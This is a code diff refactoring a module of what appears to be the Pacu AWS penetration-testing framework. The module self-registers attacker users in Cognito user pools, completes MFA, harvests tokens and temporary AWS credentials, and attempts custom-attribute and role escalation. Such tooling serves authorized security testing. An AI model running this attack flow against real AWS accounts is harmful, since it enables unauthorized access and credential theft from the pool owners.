@@ -5,10 +5,13 @@ import qrcode
 import argparse
 import json
 from pycognito.aws_srp import AWSSRP
-from typing import List, Dict
+from dataclasses import dataclass
+from typing import List, Dict, Optional
 from pycognito.exceptions import SoftwareTokenMFAChallengeException
 from copy import deepcopy
 from botocore.exceptions import ClientError
+from pacu import Main
+from botocore.client import BaseClient
 
 # Using Spencer's iam_enum.py as a template
 
@@ -50,6 +53,7 @@ module_info = {
         "--user_attributes",
     ],
 }
+
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info["description"])
 parser.add_argument(
@@ -136,7 +140,60 @@ ARG_FIELD_MAPPER = {
 }
 
 
-def main(args, pacu_main):
+@dataclass
+class SignUpResponse:
+    username: Optional[str] = None
+    is_new_user: bool = True
+
+
+def _verify_user(
+    client: BaseClient, username: str, up_client: dict, all_new_regions: list
+):
+    tokens = verify(
+        client,
+        username,
+        up_client["ClientId"],
+        up_client["UserPoolId"],
+        up_client["Region"],
+    )
+    all_new_regions.append(up_client["Region"])
+
+    return tokens
+
+
+def _authenticate_user(
+    aws: AWSSRP,
+    client: BaseClient,
+    username: str,
+    up_client: Dict,
+    all_new_regions: List,
+):
+    try_again = True
+
+    while try_again:
+        try:
+            return aws.authenticate_user()
+        except ClientError as e:
+            error_response = e.response["Error"]
+            if error_response["Code"] == "UserNotConfirmedException":
+                print("User already exists, but not confirmed. Please verify first.")
+
+                choice = input("Send new confirmation code? (y/n): ")
+                if choice.lower() in ["y", "yes"]:
+                    client.resend_confirmation_code(
+                        ClientId=up_client["ClientId"], Username=username
+                    )
+
+                _verify_user(client, username, up_client, all_new_regions)
+            else:
+                print(f"An unexpected error occurred: {error_response}")
+                try_again = False
+
+            user_input = input("Do you want to try again? (y/n): ")
+            try_again = user_input.lower() in ["y", "yes"]
+
+
+def main(args, pacu_main: Main):
     attack_users = []
     all_new_regions = []
     attack_user_pool_clients = []
@@ -268,19 +325,19 @@ def main(args, pacu_main):
         for user_pool in args.user_pools.split(","):
             region = user_pool.split("_")[0]
             client = pacu_main.get_boto3_client("cognito-idp", region)
-            response = None
+            username = None
             next_token = None
-            while response is None or next_token is not None:
+            while username is None or next_token is not None:
                 if next_token is None:
                     try:
                         print(
                             f"Trying to list original user pool clients for UserPoolId: {user_pool} in region {region}"
                         )
-                        response = client.list_user_pool_clients(
+                        username = client.list_user_pool_clients(
                             UserPoolId=user_pool, MaxResults=60
                         )
 
-                        for user_pool_client in response["UserPoolClients"]:
+                        for user_pool_client in username["UserPoolClients"]:
                             client_info = {}
                             print("User pool client found.")
                             client_info["ClientId"] = user_pool_client["ClientId"]
@@ -289,12 +346,12 @@ def main(args, pacu_main):
                             up_clients.append(client_info)
                             attack_user_pool_clients.append(client_info)
 
-                        if "NextToken" in response:
-                            next_token = response["NextToken"]
+                        if "NextToken" in username:
+                            next_token = username["NextToken"]
 
                     except ClientError as error:
                         code = error.response["Error"]["Code"]
-                        print(response)
+                        print(username)
                         print("FAILURE: ")
                         if code == "UnauthorizedOperation":
                             print("  Access denied to ListUserPoolClients.")
@@ -312,11 +369,11 @@ def main(args, pacu_main):
                         print(
                             f"Trying to list else-block user pool clients for UserPoolId: {user_pool}"
                         )
-                        response = client.list_user_pool_clients(
+                        username = client.list_user_pool_clients(
                             NextToken=next_token, UserPoolId=user_pool, MaxResults=60
                         )
 
-                        for user_pool_client in response["UserPoolClients"]:
+                        for user_pool_client in username["UserPoolClients"]:
                             client_info = {}
                             print("User pool client found.")
                             client_info["ClientId"] = user_pool_client["ClientId"]
@@ -339,9 +396,9 @@ def main(args, pacu_main):
                         print("  Skipping user pool client enumeration...")
                         break
 
-                    if "NextToken" in response:
+                    if "NextToken" in username:
                         print("NextToken found.")
-                        next_token = response["NextToken"]
+                        next_token = username["NextToken"]
                     else:
                         print("No NextToken found.")
                         break
@@ -389,14 +446,13 @@ def main(args, pacu_main):
         aws = []
         aws2session = ""
         qr_img = []
-        test = ""
         tokens = []
         client = pacu_main.get_boto3_client("cognito-idp", up_client["Region"])
         identity_client = pacu_main.get_boto3_client(
             "cognito-identity", up_client["Region"]
         )
         try:
-            response = sign_up(
+            sign_up_response = sign_up(
                 client,
                 args.email,
                 up_client["ClientId"],
@@ -405,143 +461,36 @@ def main(args, pacu_main):
                 args.user_attributes,
             )
         except Exception:
-            test = "yes"
+            print("User exists.")
+            break
 
-        if response is True or "exists" in str(response):
-            if response is True:
-                tokens = verify(
-                    client,
-                    args.username,
-                    up_client["ClientId"],
-                    up_client["UserPoolId"],
-                    up_client["Region"],
-                )
-                all_new_regions.append(up_client["Region"])
-            elif "yes" in test:
-                print("User exists.")
-            try:
-                aws = AWSSRP(
-                    username=args.username,
-                    password=args.password,
-                    pool_id=up_client["UserPoolId"],
-                    client_id=up_client["ClientId"],
-                    client=client,
-                )
-                tokens = aws.authenticate_user()
-                if "AuthenticationResult" in tokens:
-                    print("You're signed in as " + args.username + "!")
-                    print(
-                        "Your access token is: "
-                        + tokens["AuthenticationResult"]["AccessToken"]
-                    )
-                    print(
-                        "Your ID token is: " + tokens["AuthenticationResult"]["IdToken"]
-                    )
-                    print(
-                        "Your refresh token is: "
-                        + tokens["AuthenticationResult"]["RefreshToken"]
-                    )
-                    print(
-                        "Your token type is: "
-                        + tokens["AuthenticationResult"]["TokenType"]
-                    )
-                    attack_user["Username"] = args.username
-                    attack_user["Region"] = up_client["Region"]
-                    attack_user["UserPoolId"] = up_client["UserPoolId"]
-                    attack_user["ClientId"] = up_client["ClientId"]
-                    attack_user["Tokens"]["AccessToken"] = tokens[
-                        "AuthenticationResult"
-                    ]["AccessToken"]
-                    attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"][
-                        "IdToken"
-                    ]
-                    attack_user["Tokens"]["RefreshToken"] = tokens[
-                        "AuthenticationResult"
-                    ]["RefreshToken"]
-                    attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
-                        "TokenType"
-                    ]
-                    credentials = get_identity_credentials(
-                        cognito_identity_pools,
-                        identity_client,
-                        tokens["AuthenticationResult"]["IdToken"],
-                        up_client["UserPoolId"],
-                        up_client["Region"],
-                    )
-                    if credentials is not None:
-                        print("Temporary credentials retrieved!")
-                        print(credentials)
-                        attack_user["Credentials"]["AccessKeyId"] = credentials[
-                            "AccessKeyId"
-                        ]
-                        attack_user["Credentials"]["SecretKey"] = credentials[
-                            "SecretKey"
-                        ]
-                        attack_user["Credentials"]["SessionToken"] = credentials[
-                            "SessionToken"
-                        ]
-                        attack_user["Credentials"]["Expiration"] = credentials[
-                            "Expiration"
-                        ]
-                    new_tokens, new_credentials = get_custom_attributes(
-                        client,
-                        tokens,
-                        args.password,
-                        up_client["Region"],
-                        up_client["ClientId"],
-                        up_client["UserPoolId"],
-                        cognito_identity_pools,
-                        identity_client,
-                        identity_pool,
-                    )
-                    attack_user["NewTokens"] = new_tokens
-                    attack_user["NewCredentials"] = new_credentials
-                    roles = get_assumable_roles(
-                        tokens["AuthenticationResult"]["IdToken"]
-                    )
-                    attack_user["NewRoleTokens"] = prompt_assume_roles(
-                        identity_client,
-                        identity_pool,
-                        roles,
-                        region,
-                        up_client["UserPoolId"],
-                        tokens["AuthenticationResult"]["IdToken"],
-                    )
-                    if attack_user["NewRoleTokens"] is not None:
-                        attack_user["NewRoleCredentials"] = attack_user["NewRoleTokens"]
-                    attack_user_data = client.get_user(
-                        AccessToken=tokens["AuthenticationResult"]["AccessToken"]
-                    )
-                    attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
-                    attack_users.append(attack_user)
-                    continue
-            except SoftwareTokenMFAChallengeException as error:
-                try:
-                    code = input(
-                        "Please enter the MFA code generated by your application: "
-                    )
-                    print("Entering final MFA challenge")
-                    error_string = str(error)
-                    aws2session = re.search(r"'Session': '(.*?)'", error_string)
-                    if aws2session:
-                        aws2sessionfinal = aws2session.group(1)
-                    else:
-                        print("NO MATCH FOUND")
-                        continue
+        username = sign_up_response.username
 
-                    tokens = client.respond_to_auth_challenge(
-                        ClientId=up_client["ClientId"],
-                        ChallengeName="SOFTWARE_TOKEN_MFA",
-                        Session=aws2sessionfinal,
-                        ChallengeResponses={
-                            "USERNAME": args.username,
-                            "SOFTWARE_TOKEN_MFA_CODE": code,
-                        },
-                    )
-                except ClientError as err:
-                    print(err)
-                    continue
-                print("You're signed in as " + args.username + "!")
+        if username is None:
+            break
+
+        if sign_up_response.is_new_user:
+            _verify_user(client, username, up_client, all_new_regions)
+
+        try:
+            aws = AWSSRP(
+                username=username,
+                password=args.password,
+                pool_id=up_client["UserPoolId"],
+                client_id=up_client["ClientId"],
+                client=client,
+            )
+
+            tokens = _authenticate_user(
+                aws, client, username, up_client, all_new_regions
+            )
+
+            if not tokens:
+                print("Authentication process failed! Aborting...")
+                return
+
+            if "AuthenticationResult" in tokens:
+                print("You're signed in as " + username + "!")
                 print(
                     "Your access token is: "
                     + tokens["AuthenticationResult"]["AccessToken"]
@@ -554,7 +503,7 @@ def main(args, pacu_main):
                 print(
                     "Your token type is: " + tokens["AuthenticationResult"]["TokenType"]
                 )
-                attack_user["Username"] = args.username
+                attack_user["Username"] = username
                 attack_user["Region"] = up_client["Region"]
                 attack_user["UserPoolId"] = up_client["UserPoolId"]
                 attack_user["ClientId"] = up_client["ClientId"]
@@ -606,208 +555,182 @@ def main(args, pacu_main):
                     identity_client,
                     identity_pool,
                     roles,
-                    up_client["Region"],
+                    region,
                     up_client["UserPoolId"],
                     tokens["AuthenticationResult"]["IdToken"],
                 )
                 if attack_user["NewRoleTokens"] is not None:
                     attack_user["NewRoleCredentials"] = attack_user["NewRoleTokens"]
-                if new_tokens is None:
-                    attack_user_data = client.get_user(
-                        AccessToken=tokens["AuthenticationResult"]["AccessToken"]
-                    )
-                    attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
-                    attack_users.append(attack_user)
+                attack_user_data = client.get_user(
+                    AccessToken=tokens["AuthenticationResult"]["AccessToken"]
+                )
+                attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
+                attack_users.append(attack_user)
                 continue
-
-            if tokens["ChallengeName"] == "MFA_SETUP":
-                try:
-                    print("First, we need to set up an MFA application.")
-                    associate_token_response = client.associate_software_token(
-                        Session=tokens["Session"]
-                    )
-                    qr_img = qrcode.make(
-                        f"otpauth://totp/{args.username}?secret={associate_token_response['SecretCode']}"
-                    )
-                    qr_img.save("qr.png")
-                    print(
-                        "A QR code has been generated for you. Please scan it with your MFA application."
-                    )
-                    try:
-                        webbrowser.open("qr.png")
-                    except Exception:
-                        print(
-                            "Something went wrong when opening the file. Note that this cannot be done as root."
-                            "Please manually open qr.png in the working directory to scan the QR code."
-                        )
-                        continue
-
-                    mfa_code = input(
-                        "Please enter the MFA code generated by your application: "
-                    )
-                    client.verify_software_token(
-                        Session=associate_token_response["Session"], UserCode=mfa_code
-                    )
-                    print("Now that an MFA application is set up, let's sign in again.")
-                    print(
-                        "You will have to wait for a NEW MFA code to appear in your MFA application."
-                    )
-                    try:
-                        aws2 = AWSSRP(
-                            username=args.username,
-                            password=args.password,
-                            pool_id=up_client["UserPoolId"],
-                            client_id=up_client["ClientId"],
-                            client=client,
-                        )
-                        tokens = aws2.authenticate_user()
-                    except SoftwareTokenMFAChallengeException as error:
-                        try:
-                            code = input(
-                                "Please enter the MFA code generated by your application: "
-                            )
-                            print("Entering final MFA challenge")
-                            error_string = str(error)
-                            aws2session = re.search(r"'Session': '(.*?)'", error_string)
-                            if aws2session:
-                                aws2sessionfinal = aws2session.group(1)
-                            else:
-                                print("NO MATCH FOUND")
-                                continue
-
-                            tokens = client.respond_to_auth_challenge(
-                                ClientId=up_client["ClientId"],
-                                ChallengeName="SOFTWARE_TOKEN_MFA",
-                                Session=aws2sessionfinal,
-                                ChallengeResponses={
-                                    "USERNAME": args.username,
-                                    "SOFTWARE_TOKEN_MFA_CODE": code,
-                                },
-                            )
-                        except ClientError as err:
-                            print(err)
-                            continue
-                    print("You're signed in as " + args.username + "!")
-                    print(
-                        "Your access token is: "
-                        + tokens["AuthenticationResult"]["AccessToken"]
-                    )
-                    print(
-                        "Your ID token is: " + tokens["AuthenticationResult"]["IdToken"]
-                    )
-                    print(
-                        "Your refresh token is: "
-                        + tokens["AuthenticationResult"]["RefreshToken"]
-                    )
-                    print(
-                        "Your token type is: "
-                        + tokens["AuthenticationResult"]["TokenType"]
-                    )
-                    attack_user["Username"] = args.username
-                    attack_user["Region"] = up_client["Region"]
-                    attack_user["UserPoolId"] = up_client["UserPoolId"]
-                    attack_user["ClientId"] = up_client["ClientId"]
-                    attack_user["Tokens"]["AccessToken"] = tokens[
-                        "AuthenticationResult"
-                    ]["AccessToken"]
-                    attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"][
-                        "IdToken"
-                    ]
-                    attack_user["Tokens"]["RefreshToken"] = tokens[
-                        "AuthenticationResult"
-                    ]["RefreshToken"]
-                    attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
-                        "TokenType"
-                    ]
-                    credentials = get_identity_credentials(
-                        cognito_identity_pools,
-                        identity_client,
-                        tokens["AuthenticationResult"]["IdToken"],
-                        up_client["UserPoolId"],
-                        up_client["Region"],
-                    )
-                    if credentials is not None:
-                        print("Temporary credentials retrieved!")
-                        print(credentials)
-                        attack_user["Credentials"]["AccessKeyId"] = credentials[
-                            "AccessKeyId"
-                        ]
-                        attack_user["Credentials"]["SecretKey"] = credentials[
-                            "SecretKey"
-                        ]
-                        attack_user["Credentials"]["SessionToken"] = credentials[
-                            "SessionToken"
-                        ]
-                        attack_user["Credentials"]["Expiration"] = credentials[
-                            "Expiration"
-                        ]
-                    new_tokens, new_credentials = get_custom_attributes(
-                        client,
-                        tokens,
-                        args.password,
-                        up_client["Region"],
-                        up_client["ClientId"],
-                        up_client["UserPoolId"],
-                        cognito_identity_pools,
-                        identity_client,
-                        identity_pool,
-                    )
-                    attack_user["NewTokens"] = new_tokens
-                    attack_user["NewCredentials"] = new_credentials
-                    roles = get_assumable_roles(
-                        tokens["AuthenticationResult"]["IdToken"]
-                    )
-                    attack_user["NewRoleTokens"] = prompt_assume_roles(
-                        identity_client,
-                        identity_pool,
-                        roles,
-                        region,
-                        up_client["UserPoolId"],
-                        tokens["AuthenticationResult"]["IdToken"],
-                    )
-                    if attack_user["NewRoleTokens"] is not None:
-                        print(
-                            "New role tokens retrieved! Attempting to receive temporary credentials from identity pool."
-                        )
-                        new_role_credentials = get_identity_credentials(
-                            cognito_identity_pools,
-                            identity_client,
-                            attack_user["NewRoleTokens"]["IdToken"],
-                            up_client["UserPoolId"],
-                            up_client["Region"],
-                        )
-                        attack_user["NewRoleCredentials"] = new_role_credentials
-                    if new_tokens is None:
-                        attack_user_data = client.get_user(
-                            AccessToken=tokens["AuthenticationResult"]["AccessToken"]
-                        )
-                        attack_user["UserAttributes"] = attack_user_data[
-                            "UserAttributes"
-                        ]
-                        attack_users.append(attack_user)
-                    if new_tokens is not None:
-                        attack_user_data = client.get_user(
-                            AccessToken=new_tokens["AuthenticationResult"][
-                                "AccessToken"
-                            ]
-                        )
-                        attack_user["UserAttributes"] = attack_user_data[
-                            "UserAttributes"
-                        ]
-                        attack_users.append(attack_user)
-                    continue
-
-                except ClientError as err:
-                    print(err)
-                    continue
-            elif tokens["ChallengeName"] == "SOFTWARE_TOKEN_MFA":
+        except SoftwareTokenMFAChallengeException as error:
+            try:
                 code = input(
                     "Please enter the MFA code generated by your application: "
                 )
-                tokens = client.verify_software_token(
+                print("Entering final MFA challenge")
+                error_string = str(error)
+                aws2session = re.search(r"'Session': '(.*?)'", error_string)
+                if aws2session:
+                    aws2sessionfinal = aws2session.group(1)
+                else:
+                    print("NO MATCH FOUND")
+                    continue
+
+                tokens = client.respond_to_auth_challenge(
+                    ClientId=up_client["ClientId"],
+                    ChallengeName="SOFTWARE_TOKEN_MFA",
+                    Session=aws2sessionfinal,
+                    ChallengeResponses={
+                        "USERNAME": username,
+                        "SOFTWARE_TOKEN_MFA_CODE": code,
+                    },
+                )
+            except ClientError as err:
+                print(err)
+                continue
+            print("You're signed in as " + username + "!")
+            print(
+                "Your access token is: " + tokens["AuthenticationResult"]["AccessToken"]
+            )
+            print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
+            print(
+                "Your refresh token is: "
+                + tokens["AuthenticationResult"]["RefreshToken"]
+            )
+            print("Your token type is: " + tokens["AuthenticationResult"]["TokenType"])
+            attack_user["Username"] = username
+            attack_user["Region"] = up_client["Region"]
+            attack_user["UserPoolId"] = up_client["UserPoolId"]
+            attack_user["ClientId"] = up_client["ClientId"]
+            attack_user["Tokens"]["AccessToken"] = tokens["AuthenticationResult"][
+                "AccessToken"
+            ]
+            attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"]["IdToken"]
+            attack_user["Tokens"]["RefreshToken"] = tokens["AuthenticationResult"][
+                "RefreshToken"
+            ]
+            attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
+                "TokenType"
+            ]
+            credentials = get_identity_credentials(
+                cognito_identity_pools,
+                identity_client,
+                tokens["AuthenticationResult"]["IdToken"],
+                up_client["UserPoolId"],
+                up_client["Region"],
+            )
+            if credentials is not None:
+                print("Temporary credentials retrieved!")
+                print(credentials)
+                attack_user["Credentials"]["AccessKeyId"] = credentials["AccessKeyId"]
+                attack_user["Credentials"]["SecretKey"] = credentials["SecretKey"]
+                attack_user["Credentials"]["SessionToken"] = credentials["SessionToken"]
+                attack_user["Credentials"]["Expiration"] = credentials["Expiration"]
+            new_tokens, new_credentials = get_custom_attributes(
+                client,
+                tokens,
+                args.password,
+                up_client["Region"],
+                up_client["ClientId"],
+                up_client["UserPoolId"],
+                cognito_identity_pools,
+                identity_client,
+                identity_pool,
+            )
+            attack_user["NewTokens"] = new_tokens
+            attack_user["NewCredentials"] = new_credentials
+            roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
+            attack_user["NewRoleTokens"] = prompt_assume_roles(
+                identity_client,
+                identity_pool,
+                roles,
+                up_client["Region"],
+                up_client["UserPoolId"],
+                tokens["AuthenticationResult"]["IdToken"],
+            )
+            if attack_user["NewRoleTokens"] is not None:
+                attack_user["NewRoleCredentials"] = attack_user["NewRoleTokens"]
+            if new_tokens is None:
+                attack_user_data = client.get_user(
+                    AccessToken=tokens["AuthenticationResult"]["AccessToken"]
+                )
+                attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
+                attack_users.append(attack_user)
+            continue
+
+        if tokens["ChallengeName"] == "MFA_SETUP":
+            try:
+                print("First, we need to set up an MFA application.")
+                associate_token_response = client.associate_software_token(
+                    Session=tokens["Session"]
+                )
+                qr_img = qrcode.make(
+                    f"otpauth://totp/{username}?secret={associate_token_response['SecretCode']}"
+                )
+                qr_img.save("qr.png")
+                print(
+                    "A QR code has been generated for you. Please scan it with your MFA application."
+                )
+                try:
+                    webbrowser.open("qr.png")
+                except Exception:
+                    print(
+                        "Something went wrong when opening the file. Note that this cannot be done as root."
+                        "Please manually open qr.png in the working directory to scan the QR code."
+                    )
+                    continue
+
+                mfa_code = input(
+                    "Please enter the MFA code generated by your application: "
+                )
+                client.verify_software_token(
                     Session=associate_token_response["Session"], UserCode=mfa_code
                 )
-                print("You're signed in as " + args.username + "!")
+                print("Now that an MFA application is set up, let's sign in again.")
+                print(
+                    "You will have to wait for a NEW MFA code to appear in your MFA application."
+                )
+                try:
+                    aws2 = AWSSRP(
+                        username=username,
+                        password=args.password,
+                        pool_id=up_client["UserPoolId"],
+                        client_id=up_client["ClientId"],
+                        client=client,
+                    )
+                    tokens = aws2.authenticate_user()
+                except SoftwareTokenMFAChallengeException as error:
+                    try:
+                        code = input(
+                            "Please enter the MFA code generated by your application: "
+                        )
+                        print("Entering final MFA challenge")
+                        error_string = str(error)
+                        aws2session = re.search(r"'Session': '(.*?)'", error_string)
+                        if aws2session:
+                            aws2sessionfinal = aws2session.group(1)
+                        else:
+                            print("NO MATCH FOUND")
+                            continue
+
+                        tokens = client.respond_to_auth_challenge(
+                            ClientId=up_client["ClientId"],
+                            ChallengeName="SOFTWARE_TOKEN_MFA",
+                            Session=aws2sessionfinal,
+                            ChallengeResponses={
+                                "USERNAME": username,
+                                "SOFTWARE_TOKEN_MFA_CODE": code,
+                            },
+                        )
+                    except ClientError as err:
+                        print(err)
+                        continue
+                print("You're signed in as " + username + "!")
                 print(
                     "Your access token is: "
                     + tokens["AuthenticationResult"]["AccessToken"]
@@ -820,7 +743,7 @@ def main(args, pacu_main):
                 print(
                     "Your token type is: " + tokens["AuthenticationResult"]["TokenType"]
                 )
-                attack_user["Username"] = args.username
+                attack_user["Username"] = username
                 attack_user["Region"] = up_client["Region"]
                 attack_user["UserPoolId"] = up_client["UserPoolId"]
                 attack_user["ClientId"] = up_client["ClientId"]
@@ -888,12 +811,106 @@ def main(args, pacu_main):
                         up_client["Region"],
                     )
                     attack_user["NewRoleCredentials"] = new_role_credentials
-                attack_user_data = client.get_user(
-                    AccessToken=tokens["AuthenticationResult"]["AccessToken"]
+                if new_tokens is None:
+                    attack_user_data = client.get_user(
+                        AccessToken=tokens["AuthenticationResult"]["AccessToken"]
+                    )
+                    attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
+                    attack_users.append(attack_user)
+                if new_tokens is not None:
+                    attack_user_data = client.get_user(
+                        AccessToken=new_tokens["AuthenticationResult"]["AccessToken"]
+                    )
+                    attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
+                    attack_users.append(attack_user)
+                continue
+
+            except ClientError as err:
+                print(err)
+                continue
+        elif tokens["ChallengeName"] == "SOFTWARE_TOKEN_MFA":
+            code = input("Please enter the MFA code generated by your application: ")
+            tokens = client.verify_software_token(
+                Session=associate_token_response["Session"], UserCode=mfa_code
+            )
+            print("You're signed in as " + username + "!")
+            print(
+                "Your access token is: " + tokens["AuthenticationResult"]["AccessToken"]
+            )
+            print("Your ID token is: " + tokens["AuthenticationResult"]["IdToken"])
+            print(
+                "Your refresh token is: "
+                + tokens["AuthenticationResult"]["RefreshToken"]
+            )
+            print("Your token type is: " + tokens["AuthenticationResult"]["TokenType"])
+            attack_user["Username"] = username
+            attack_user["Region"] = up_client["Region"]
+            attack_user["UserPoolId"] = up_client["UserPoolId"]
+            attack_user["ClientId"] = up_client["ClientId"]
+            attack_user["Tokens"]["AccessToken"] = tokens["AuthenticationResult"][
+                "AccessToken"
+            ]
+            attack_user["Tokens"]["IdToken"] = tokens["AuthenticationResult"]["IdToken"]
+            attack_user["Tokens"]["RefreshToken"] = tokens["AuthenticationResult"][
+                "RefreshToken"
+            ]
+            attack_user["Tokens"]["TokenType"] = tokens["AuthenticationResult"][
+                "TokenType"
+            ]
+            credentials = get_identity_credentials(
+                cognito_identity_pools,
+                identity_client,
+                tokens["AuthenticationResult"]["IdToken"],
+                up_client["UserPoolId"],
+                up_client["Region"],
+            )
+            if credentials is not None:
+                print("Temporary credentials retrieved!")
+                print(credentials)
+                attack_user["Credentials"]["AccessKeyId"] = credentials["AccessKeyId"]
+                attack_user["Credentials"]["SecretKey"] = credentials["SecretKey"]
+                attack_user["Credentials"]["SessionToken"] = credentials["SessionToken"]
+                attack_user["Credentials"]["Expiration"] = credentials["Expiration"]
+            new_tokens, new_credentials = get_custom_attributes(
+                client,
+                tokens,
+                args.password,
+                up_client["Region"],
+                up_client["ClientId"],
+                up_client["UserPoolId"],
+                cognito_identity_pools,
+                identity_client,
+                identity_pool,
+            )
+            attack_user["NewTokens"] = new_tokens
+            attack_user["NewCredentials"] = new_credentials
+            roles = get_assumable_roles(tokens["AuthenticationResult"]["IdToken"])
+            attack_user["NewRoleTokens"] = prompt_assume_roles(
+                identity_client,
+                identity_pool,
+                roles,
+                region,
+                up_client["UserPoolId"],
+                tokens["AuthenticationResult"]["IdToken"],
+            )
+            if attack_user["NewRoleTokens"] is not None:
+                print(
+                    "New role tokens retrieved! Attempting to receive temporary credentials from identity pool."
                 )
-                attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
-                attack_users.append(attack_user)
-                break
+                new_role_credentials = get_identity_credentials(
+                    cognito_identity_pools,
+                    identity_client,
+                    attack_user["NewRoleTokens"]["IdToken"],
+                    up_client["UserPoolId"],
+                    up_client["Region"],
+                )
+                attack_user["NewRoleCredentials"] = new_role_credentials
+            attack_user_data = client.get_user(
+                AccessToken=tokens["AuthenticationResult"]["AccessToken"]
+            )
+            attack_user["UserAttributes"] = attack_user_data["UserAttributes"]
+            attack_users.append(attack_user)
+            break
 
     if regions != []:
         print("Running cognito__enum again to add new users to Pacu database.")
@@ -910,7 +927,7 @@ def main(args, pacu_main):
     search_string = "custom"
 
     choice = input("List all custom attributes for all users in all user pools (y/n)?")
-    if choice.lower() == "y" and session.Cognito["UsersInPools"] is not None:
+    if choice.lower() == "y" and session.Cognito.get("UsersInPools", None) is not None:
         for user in session.Cognito["UsersInPools"]:
             if any(
                 search_string in attribute["Name"] for attribute in user["Attributes"]
@@ -974,7 +991,17 @@ def parse_user_attributes(user_attributes: str) -> List[Dict[str, str]]:
     return json_data
 
 
-def sign_up(client, email, client_id, username, password, user_attributes=None):
+def sign_up(
+    client,
+    email: str,
+    client_id: str,
+    username: str,
+    password: str,
+    user_attributes: List[Dict[str, str]] = None,
+) -> SignUpResponse:
+
+    response = SignUpResponse(username=username)
+
     user_attributes = user_attributes or []
     email_exists = any(attribute["Name"] == "email" for attribute in user_attributes)
 
@@ -989,10 +1016,11 @@ def sign_up(client, email, client_id, username, password, user_attributes=None):
             UserAttributes=user_attributes,
         )
         print(f"Successfully signed up user {username}.")
-        return True
+        return response
     except client.exceptions.UsernameExistsException:
         print(f"Username {username} already exists. Attempting to log in.")
-        return "exists"
+        response.is_new_user = False
+        return response
     except client.exceptions.InvalidParameterException as e:
         error_message = str(e)
         print(error_message)
@@ -1026,7 +1054,7 @@ def sign_up(client, email, client_id, username, password, user_attributes=None):
             )
     except Exception as e:
         print(f"Error signing up user {username}: {str(e)}")
-        return False
+        return SignUpResponse()
 
 
 def verify(client, username, client_id, user_pool_id, region):
